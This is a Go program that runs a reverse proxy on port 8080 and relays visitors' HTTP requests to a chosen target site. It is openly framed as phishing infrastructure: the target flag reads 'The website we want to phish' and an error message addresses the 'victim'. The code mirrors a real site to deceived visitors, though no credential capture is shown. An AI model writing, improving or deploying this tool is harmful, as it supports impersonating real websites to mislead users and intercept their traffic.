package main

import (
	"bufio"
	"flag"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"time"
)

var targetURL = flag.String("target", "", "The website we want to phish")

func proxyRequest(u *url.URL, conn net.Conn) {
	reader := bufio.NewReader(conn)
	request, err := http.ReadRequest(reader)
	if err != nil {
		log.Println("Error parsing request:", err.Error())
		return
	}

	request.URL.Scheme = u.Scheme
	request.URL.Host = u.Host
	request.Host = u.Host
	log.Println("Sending", request.Method, "request to", request.URL.String())

	// Prevent panics, see: https://stackoverflow.com/questions/19595860/http-request-requesturi-field-when-making-request-in-go
	request.RequestURI = ""
	http.DefaultClient.Timeout = 20 * time.Second
	resp, err := http.DefaultClient.Do(request)
	if err != nil {
		log.Println("Proxy error:", err.Error())
		return
	}

	log.Println("Got response", resp.Status)
	responseBody, err := httputil.DumpResponse(resp, true)
	if err != nil {
		log.Println("Error converting requests to bytes:", err.Error())
		return
	}
	_, err = conn.Write(responseBody)
	if err != nil {
		log.Println("Error responding to victim:", err.Error())
		return
	}
	err = conn.Close()
	if err != nil {
		log.Println("Error closing connection: ", err.Error())
		return
	}
}

func main() {
	flag.Parse()
	log.Println("Setting target to", *targetURL)
	u, err := url.Parse(*targetURL)
	if err != nil {
		panic(err.Error())
	}

	server, err := net.Listen("tcp", ":8080")
	if err != nil {
		panic(err.Error())
	}
	for {
		conn, err := server.Accept()
		if err != nil {
			log.Println("Error when accepting request, ", err.Error())
		}
		go proxyRequest(u, conn)
	}
}
